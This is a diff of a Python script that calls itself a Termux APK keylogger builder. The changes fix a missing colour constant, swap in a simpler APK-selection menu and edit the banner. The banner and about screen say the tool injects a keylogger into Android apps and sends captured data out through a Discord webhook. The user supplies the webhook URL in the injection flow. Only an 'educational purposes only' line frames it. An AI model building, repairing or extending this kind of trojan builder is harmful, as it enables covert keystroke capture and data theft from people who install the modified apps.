@@ -1,8 +1,8 @@
 #!/usr/bin/env python3
 """
 ============================================================
-  TERMUX APK KEYLOGGER BUILDER v4.0
-  Interactive APK selection – no copy-paste needed!
+  TERMUX APK KEYLOGGER BUILDER v3.1
+  Fixed: Colors.WHITE error + APK selection menu
   Developer: GT Security Team
 ============================================================
 """
@@ -15,7 +15,6 @@ import uuid
 import json
 import time
 import requests
-import glob
 from datetime import datetime
 
 # ---------------------------- COLORS ----------------------------
@@ -26,6 +25,7 @@ class Colors:
     GREEN = '\033[92m'
     YELLOW = '\033[93m'
     RED = '\033[91m'
+    WHITE = '\033[97m'          # <--- FIXED: Added WHITE
     RESET = '\033[0m'
     BOLD = '\033[1m'
     UNDERLINE = '\033[4m'
@@ -192,65 +192,6 @@ def upload_to_cloud(filepath):
         pass
     return None
 
-# ---------------------------- INTERACTIVE APK SELECTOR ----------------------------
-def find_apk_files():
-    """Search for APK files in common directories."""
-    search_dirs = [
-        '/sdcard/Download',
-        '/sdcard/Downloads',
-        '/sdcard/',
-        '/storage/emulated/0/Download',
-        '/storage/emulated/0/',
-        '/data/app',  # system installed apps (may not be accessible)
-    ]
-    apk_files = []
-    for dir_path in search_dirs:
-        if os.path.exists(dir_path):
-            # use glob to find .apk files recursively (one level)
-            for ext in ['*.apk', '*.APK']:
-                pattern = os.path.join(dir_path, ext)
-                found = glob.glob(pattern)
-                apk_files.extend(found)
-            # also check subdirectories (two levels)
-            for sub in ['*/*.apk', '*/*.APK']:
-                pattern = os.path.join(dir_path, sub)
-                found = glob.glob(pattern)
-                apk_files.extend(found)
-    # remove duplicates
-    apk_files = list(set(apk_files))
-    return sorted(apk_files)
-
-def select_apk():
-    """Display APK list and let user choose by number."""
-    apk_files = find_apk_files()
-    if not apk_files:
-        print_c("\n[!] No APK files found in common directories.", Colors.RED)
-        print_c("   Please copy your APK to /sdcard/Download/ and try again.", Colors.YELLOW)
-        return None
-
-    print_c("\n📱 Found APK files:", Colors.BLUE)
-    for idx, path in enumerate(apk_files, 1):
-        # Show only filename for simplicity, but keep full path
-        size = os.path.getsize(path) / (1024 * 1024)
-        print_c(f"  [{idx}] {os.path.basename(path)} ({size:.1f} MB)", Colors.WHITE)
-
-    print_c("\n[0] Enter path manually", Colors.YELLOW)
-    choice = input("\n[?] Select APK by number (or 0 for manual): ").strip()
-
-    if choice == '0':
-        return input("📁 Enter full APK path: ").strip()
-    else:
-        try:
-            idx = int(choice) - 1
-            if 0 <= idx < len(apk_files):
-                return apk_files[idx]
-            else:
-                print_c("[!] Invalid number.", Colors.RED)
-                return None
-        except ValueError:
-            print_c("[!] Invalid input.", Colors.RED)
-            return None
-
 # ---------------------------- INJECTION ENGINE ----------------------------
 def inject_apk(input_apk, output_dir, webhook, features, interval):
     work_dir = os.path.join(output_dir, f"work_{uuid.uuid4()}")
@@ -323,6 +264,40 @@ def inject_apk(input_apk, output_dir, webhook, features, interval):
         shutil.rmtree(work_dir, ignore_errors=True)
         raise e
 
+# ---------------------------- APK SELECTION ----------------------------
+def select_apk():
+    """Let user select APK from Download folder or enter custom path."""
+    download_dir = "/sdcard/Download"
+    apks = []
+    
+    # Check if Download folder exists
+    if os.path.exists(download_dir):
+        for f in os.listdir(download_dir):
+            if f.endswith('.apk'):
+                full_path = os.path.join(download_dir, f)
+                size = os.path.getsize(full_path) / (1024 * 1024)
+                apks.append((full_path, f, size))
+    
+    if apks:
+        print_c("\n📱 APK files found in /sdcard/Download/:", Colors.CYAN)
+        print_c("   [0] Enter custom path", Colors.YELLOW)
+        for idx, (path, name, size) in enumerate(apks, 1):
+            print_c(f"   [{idx}] {name} ({size:.1f} MB)", Colors.WHITE)
+        
+        choice = input("\n[?] Select APK number (or 0 for custom path): ").strip()
+        
+        if choice.isdigit():
+            idx = int(choice)
+            if idx == 0:
+                return input("📁 Enter full APK path: ").strip()
+            elif 1 <= idx <= len(apks):
+                return apks[idx-1][0]
+    
+    # If no APKs found or invalid choice
+    print_c("\n📌 Tip: Place your APK in /sdcard/Download/", Colors.YELLOW)
+    print_c("   Or enter full path manually.", Colors.YELLOW)
+    return input("📁 Enter APK path: ").strip()
+
 # ---------------------------- MENU FUNCTIONS ----------------------------
 def clear_screen():
     os.system('clear' if os.name == 'posix' else 'cls')
@@ -330,9 +305,9 @@ def clear_screen():
 def show_banner():
     print_c("""
     ╔═══════════════════════════════════════════╗
-    ║   APK KEYLOGGER BUILDER v4.0             ║
-    ║   Interactive APK picker                 ║
-    ║   No copy-paste needed!                  ║
+    ║   APK KEYLOGGER BUILDER v3.1             ║
+    ║   Local injection, cloud upload          ║
+    ║   Discord webhook data exfiltration      ║
     ╚═══════════════════════════════════════════╝
     """, Colors.CYAN)
 
@@ -350,11 +325,14 @@ def inject_flow():
     show_banner()
     print_c("\n--- INJECT APK ---", Colors.BLUE)
 
-    # APK selection
+    # APK path selection
     apk_path = select_apk()
-    if not apk_path:
+    if not apk_path or not os.path.exists(apk_path):
+        print_c("[!] File not found.", Colors.RED)
         input("\n[Press Enter to go back]")
         return
+
+    print_c(f"[✓] Selected: {apk_path}", Colors.GREEN)
 
     # Webhook
     webhook = input("🔗 Discord Webhook URL: ").strip()
@@ -425,7 +403,6 @@ def about():
     print_c("  - Discord webhook for data exfiltration")
     print_c("  - Local processing – no server needed")
     print_c("  - Upload to cloud for easy sharing")
-    print_c("  - Interactive APK picker – no typing required!")
     print_c("\nDeveloper: GT Security Team")
     print_c("For educational purposes only.")
     input("\n[Press Enter to go back]")
